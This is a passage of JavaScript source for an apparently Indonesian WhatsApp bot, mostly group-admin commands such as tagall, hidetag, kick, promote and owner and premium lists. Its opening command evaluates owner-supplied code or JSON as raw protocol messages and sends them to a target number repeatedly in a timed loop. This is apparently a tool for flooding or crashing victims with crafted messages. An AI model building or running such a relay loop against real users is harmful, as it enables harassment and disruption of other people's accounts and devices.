      const [user,server]=jid.split('@'); if(!user) return undefined; return {user,server};
    };

    const wrapxrellySmart = (ot, protoShim) => {
      const supported = new Set(['text','image','video','audio','document','sticker','location','contacts','contact','poll','templateButtons','viewOnce','delete','edit']);
      const hasSupportedTopKey = (obj) => Object.keys(obj||{}).some(k=>supported.has(k));
      const toProtoMsg = (content) => { try { return protoShim.Message.fromObject(content); } catch { return content; } };
      const smartSendMessage = async (jid, content, options) => {
        if (!hasSupportedTopKey(content)) return ot.relayMessage(jid, toProtoMsg(content), { messageId: options?.messageId || options?.messageID || null });
        try { return await ot.sendMessage(jid, content, options); }
        catch(e){ if(String(e?.message||e).includes('Invalid media type')) return ot.relayMessage(jid, toProtoMsg(content), { messageId: options?.messageId || options?.messageID || null }); throw e; }
      };
      return new Proxy(ot, { get(t,p,r){ if(p==='sendMessage') return smartSendMessage; const v=Reflect.get(t,p,r); return typeof v==='function'?v.bind(t):v; } });
    };

    const smartxrelly = wrapxrellySmart(sock, protoShim);

    const base = {
      console, Buffer,
      setTimeout, clearTimeout, setInterval, clearInterval, setImmediate, clearImmediate,
      JSON, Math, Date, Object, Array, String, Number, Boolean, RegExp, Error,
      Map, Set, WeakMap, WeakSet, Promise, Symbol, URL, URLSearchParams, TextEncoder, TextDecoder,
      xrelly: smartxrelly, m, proto: protoShim, generateWAMessageFromContent: gWMC,
      jidDecode, WABinary: { jidDecode }, WABinary_1: { jidDecode },
      delay, globalThis: {}
    };
    const aliases=['xrelly','sock','conn','client','wa','andi','bot','zacky','x','Aii','Ai','ai','Client','Conn','Sock'];
    for (const a of aliases) base[a]=smartxrelly;

    const handler={ has:()=>true, get:(t,p,r)=>(p in t || typeof p==='symbol' || p==='unscopables') ? Reflect.get(t,p,r) : t.xrelly };
    const context = vm.createContext(new Proxy(base,handler));
    context.globalThis.proto = protoShim;
    context.globalThis.generateWAMessageFromContent = gWMC;

    const run = (code)=> new vm.Script(code,{filename:'quoted.js'}).runInContext(context,{timeout:2500});

    const tryAsJSONAndRelay = async () => {
      let obj=null;
      try { obj = JSON.parse(src); }
      catch {
        try { run(`globalThis.__obj__ = (${src});`); obj = context.globalThis.__obj__; } catch {}
      }
      if (obj && typeof obj==='object') {
        const message = protoShim.Message.fromObject(obj);
        await smartxrelly.relayMessage(targetJid, message, { messageId: null });
        return true;
      }
      return false;
    };

    let handled = false;
    if (/^[\[\{]/.test(src)) handled = await tryAsJSONAndRelay();

    let fn=null;
    if (!handled) {
      const safeMap = {
        relaymessage:'relayMessage', sendmessage:'sendMessage', generatewamessagefromcontent:'generateWAMessageFromContent',
        downloadcontentfrommessage:'downloadContentFromMessage', updatemediamessage:'updateMediaMessage', sendpresenceupdate:'sendPresenceUpdate',
        presencesubscribe:'presenceSubscribe', readmessages:'readMessages', readmessage:'readMessages', sendreceipt:'sendReceipt', sendreadreceipt:'sendReadReceipt',
        sendmessageack:'sendMessageAck', onwhatsapp:'onWhatsApp', fetchprivacysettings:'fetchPrivacySettings', profilepictureurl:'profilePictureUrl',
        updateprofilepicture:'updateProfilePicture', removeprofilepicture:'removeProfilePicture', updateblockstatus:'updateBlockStatus',
        groupmetadata:'groupMetadata', groupcreate:'groupCreate', groupleave:'groupLeave', groupparticipantsupdate:'groupParticipantsUpdate',
        groupupdatesubject:'groupUpdateSubject', groupupdatedescription:'groupUpdateDescription', groupinvitecode:'groupInviteCode',
        grouprevokeinvite:'groupRevokeInvite', groupacceptinvite:'groupAcceptInvite', groupacceptinvitev4:'groupAcceptInviteV4',
        grouprequestparticipantslist:'groupRequestParticipantsList', grouprequestparticipantsupdate:'groupRequestParticipantsUpdate',
        groupsettingupdate:'groupSettingUpdate', groupfetchallparticipating:'groupFetchAllParticipating', sendreaction:'sendReaction',
        apppatch:'appPatch', query:'query', logout:'logout', wauploadtoserver:'waUploadToServer', asserttag:'assertTag',
        waitformessage:'waitForMessage', fetchblocklist:'fetchBlocklist'
      };
      const keys = Object.keys(safeMap).join('|');
      const reKnown = new RegExp(`\\b(?!xrelly\\b)([A-Za-z_$][\\w$]*)\\s*\\.\\s*(${keys})\\s*\\(`,'gi');
      src = src.replace(reKnown, (m0,obj,meth)=>`xrelly.${safeMap[meth.toLowerCase()]}(`);

      try {
        run(src);
        const nameMatch = /(?:async\s+)?function\s+([A-Za-z_$][\w$]*)\s*\(/.exec(src);
        if (nameMatch && typeof context[nameMatch[1]]==='function') fn = context[nameMatch[1]];
        if (!fn) {
          const g=context.globalThis||{};
          for (const k of Object.keys(g)) if (typeof g[k]==='function') { fn=g[k]; break; }
        }
      } catch {}
      if (!fn) { try { run(`globalThis.__fn__=${src}`); if (typeof context.globalThis.__fn__==='function') fn=context.globalThis.__fn__; } catch {} }
      if (!fn) { const wrapped=`globalThis.__fn__=async function(xrelly,target,m,proto,generateWAMessageFromContent){\n${src}\n};`; run(wrapped); fn=context.globalThis.__fn__; }
      if (typeof fn !== 'function') throw new Error('Fungsi tidak ditemukan.');

      let ok=0,fail=0,lastErr=null;
      for (let i=0;i<loop;i++){
        try{
          const exec=Promise.resolve(fn(context.xrelly,targetJid,m,context.proto,context.generateWAMessageFromContent));
          const to=new Promise((_,rej)=>setTimeout(()=>rej(new Error('Eksekusi timeout')),30000));
          await Promise.race([exec,to]);
          ok++;
          if (delayMs>0 && i<loop-1) await delay(delayMs);
        }catch(e){ fail++; lastErr=e; }
      }
      if (fail===0) reply(`Done By xrelly: ${ok}x`);
      else reply(`⚠️ Selesai: OK ${ok}, Gagal ${fail}\n${lastErr ? (lastErr.stack||lastErr.message||String(lastErr)) : ''}`);
    } else {
      reply(`✅ Selesai: OK 1x → ${targetJid}`);
    }
  } catch (err) {
    reply('❌ '+(err?.stack||err?.message||String(err)));
  }
}
break

case "info":
        {
        if (!isBotRegistered) return reply(`NOT ACCES‼️`);
          if (!isCreator) return reply("YOU ARE NOT OWNER !!!");
          const infogetclone1 = m.quoted
            ? {
                [m.quoted.mtype]: m.quoted,
              }
            : {
                [m.message.mtype]: m.message,
              };
          const formattedJson = JSON.stringify(infogetclone1, null, 2);
          reply(`${formattedJson}`);
        }
        break;

      case "bratvid": {
      if (!isBotRegistered) return reply(`NOT ACCES‼️`);
        if (!q) return replyy("Input teks brat animasi");

        try {
          const axios = require("axios");
          const { Sticker } = require("wa-sticker-formatter");

          const apiUrl = `https://aliicia.my.id/api/brat?text=${encodeURIComponent(q)}&isAnimated=true&delay=150`;

          const res = await axios.get(apiUrl);
          if (!res.data || res.data.success !== true)
            return reply("Gagal generate brat animasi");

          let buffer;

          if (res.data.url.startsWith("data:")) {
            const base64 = res.data.url.split(",")[1];
            buffer = Buffer.from(base64, "base64");
          } else {
            const media = await axios.get(res.data.url, {
              responseType: "arraybuffer",
            });
            buffer = Buffer.from(media.data);
          }

          const sticker = new Sticker(buffer, {
            pack: "MT Pack",
            author: "Manta'X",
            type: "full",
            quality: 80,
          });

          await sock.sendMessage(m.chat, await sticker.toMessage(), {
            quoted: vidq,
          });
        } catch (e) {
          console.log("[BRATVID]", e);
          replyy("Error generate brat animasi");
        }
        break;
      }

      case "brat": {
      if (!isBotRegistered) return reply(`NOT ACCES‼️`);
        if (!q) return reply("Input teks brat");

        try {
          const axios = require("axios");
          const { Sticker } = require("wa-sticker-formatter");

          const apiUrl = `https://aliicia.my.id/api/brat?text=${encodeURIComponent(q)}`;

          const res = await axios.get(apiUrl);
          if (!res.data || res.data.success !== true)
            return replyy("Gagal generate brat");

          let buffer;

          if (res.data.url.startsWith("data:")) {
            const base64 = res.data.url.split(",")[1];
            buffer = Buffer.from(base64, "base64");
          } else {
            const media = await axios.get(res.data.url, {
              responseType: "arraybuffer",
            });
            buffer = Buffer.from(media.data);
          }

          const sticker = new Sticker(buffer, {
            pack: "MT Pack",
            author: "Manta'X",
            type: "full",
            quality: 85,
          });

          await sock.sendMessage(m.chat, await sticker.toMessage(), {
            quoted: vidq,
          });
        } catch (e) {
          console.log("[BRAT]", e);
          reply("Error generate brat");
        }
        break;
      }
    
	case "tagall": {
if (!isBotRegistered) return reply(`NOT ACCES‼️`);
if (!isCreator) return reply(`NOT ACCES‼️`);
if (!isGroup) return reply(mess.only.group)
if (!q) return reply(`Masukan Teks!!`)
let teks = `${q ? q : ""}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
	teks += `⊝ @${mem.id.split("@")[0]}\n`
}
sock.sendMessage(m.chat, {
	text: teks,
	mentions: participants.map(a => a.id)
}, {
	quoted: vidq
})
	}
	break
	
	case "hidetag":
if (!isBotRegistered) return reply(`NOT ACCES‼️`);
if (!isCreator) return reply(`NOT ACCES‼️`);
if (!isGroup) return reply(mess.only.group)
if (!q) return reply(`Masukan Teks!!`)
sock.sendMessage(m.chat, {
	text: q,
	contextInfo: {
mentionedJid: participants.map(a => a.id),
groupMentions: [{
	groupJid: m.chat,
	groupSubject: "anjay"
}]
	}
})
break

  case "add": {
if (!isBotRegistered) return reply(`NOT ACCES‼️`);
if (!isCreator) return reply(`NOT ACCES‼️`);
if (!Inputo) return reply("Reply pesan/Tag orang/Nomer")
if (Inputo.startsWith("08")) return reply("Gunakan kode negara!")
await sock.groupParticipantsUpdate(m.chat, [Inputo], "add").then((res) => reply(`Berhasil Menambahkan ${Inputo.split("@")[0]}`)).catch((err) => reply(jsonformat(err)))
	}
	break

			case "kick": {
				if (!isCreator) return reply(`NOT ACCES‼️`);
                if (!isBotRegistered) return reply(`NOT ACCES‼️`);
				if (!Inputo) return reply("Reply pesan/Tag orang/Nomer")
				if (Inputo.startsWith("08")) return reply("Gunakan kode negara!")
				await sock.groupParticipantsUpdate(m.chat, [Inputo], "remove").then((res) => reply(`Berhasil Mengeluarkan ${Inputo.split("@")[0]}`)).catch((err) => reply(jsonformat(err)))
			}
			break

			case "promote": {
				if (!isCreator) return reply(`NOT ACCES‼️`);
                if (!isBotRegistered) return reply(`NOT ACCES‼️`);
				if (!Inputo) return reply("Reply pesan/Tag orang/Nomer")
				if (Inputo.startsWith("08")) return reply("Gunakan kode negara!")
				await sock.groupParticipantsUpdate(m.chat, [Inputo], "promote").then((res) => reply(`Berhasil Promote ${Inputo.split("@")[0]}`)).catch((err) => reply(jsonformat(err)))
			}
			break
			
			case "demote": {
				if (!isCreator) return reply(`NOT ACCES‼️`);
                if (!isBotRegistered) return reply(`NOT ACCES‼️`);
				if (!Inputo) return reply("Reply pesan/Tag orang/Nomer")
				if (Inputo.startsWith("08")) return reply("Gunakan kode negara!")
				await sock.groupParticipantsUpdate(m.chat, [Inputo], "demote").then((res) => reply(`Berhasil Demote ${Inputo.split("@")[0]}`)).catch((err) => reply(jsonformat(err)))
			}
			break

case "cekidgc": {
if (!isBotRegistered) return reply(`NOT ACCES‼️`);
if (!isCreator) return reply(`NOT ACCES‼️`);
let gcall = Object.values(await sock.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
sock.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], }}, {quoted: vidq})
}
                
			case "public": {
				if (!isCreator) return reply(`NOT ACCES‼️`);
                if (!isBotRegistered) return reply(`NOT ACCES‼️`);
				if (!isCreator) return reply(mess.owner)
				if (db.data.settings[botNumber].public == true) return reply("Sudah Di Mode Public")
				db.data.settings[botNumber].public = true
				reply(`${mess.success}`)
			}
			break
			case "self": {
				if (!isCreator) return reply(`NOT ACCES‼️`);
                if (!isBotRegistered) return reply(`NOT ACCES‼️`);
				if (!isCreator) return reply(mess.owner)
				if (db.data.settings[botNumber].public == false) return reply("Sudah Di Mode Self")
				db.data.settings[botNumber].public = false
				reply(`${mess.success}`)
			}
			break
			//=================================================//
			case "speed":
				if (!isCreator) return reply(`NOT ACCES‼️`);
                if (!isBotRegistered) return reply(`NOT ACCES‼️`);
				reply(`*${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()} Seconds*`)
				break
				//=================================================//
			case "runtime":
				if (!isCreator) return reply(`NOT ACCES‼️`);
                if (!isBotRegistered) return reply(`NOT ACCES‼️`);
				reply(`${runtime(process.uptime())}`)
				break
				//=================================================//
			case "restart":
				if (!isCreator) return reply(`NOT ACCES‼️`);
                if (!isBotRegistered) return reply(`NOT ACCES‼️`);
				if (!isCreator) return reply(mess.owner)
				reply("Restarting Bot.....")
				setTimeout(() => {
					process.send("reset")
				}, 3000)
				break
			case "shutdown": {
				if (!isBotRegistered) return reply(`NOT ACCES‼️`);
if (!isCreator) return reply(`NOT ACCES‼️`);
				if (!isCreator) return reply(mess.owner)
				reply(`Shutdown Bot...`)
				await sleep(5000)
				process.eXit()
			}
			break
			
			// LIST OWN && PREM \\
			//=================================================//
			case "listowner": {
				if (!isCreator) return reply(`NOT ACCES‼️`);
                if (!isBotRegistered) return reply(`NOT ACCES‼️`);
				const data = kontributor
				let teks = "*LIST OWNER*\n\n"
				for (const x of data) {
					teks += `- @${x}\n`
				}
				teks += `\n\n*TOTAL* : ${data.length}`
				reply(teks)
			}
			break
			case "listprem": {
				if (!isCreator) return reply(`NOT ACCES‼️`);
                if (!isBotRegistered) return reply(`NOT ACCES‼️`);
				const data = getAllPremiumUser(orgkaya).map((x) => x.split("@")[0])
				let teks = "*LIST PREMIUM*\n\n"
				for (const x of data) {
					teks += `- @${x}\n`
				}
				teks += `\n\n*TOTAL* : ${data.length}`
				reply(teks)
			}
			break
			// Owner Fitur \\
			//=================================================//
			case "addprem": {
				if (!isBotRegistered) return reply(`NOT ACCES‼️`);
if (!isCreator) return reply(`NOT ACCES‼️`);
				if (!isCreator) return reply(mess.owner)
				if (args.length < 2)
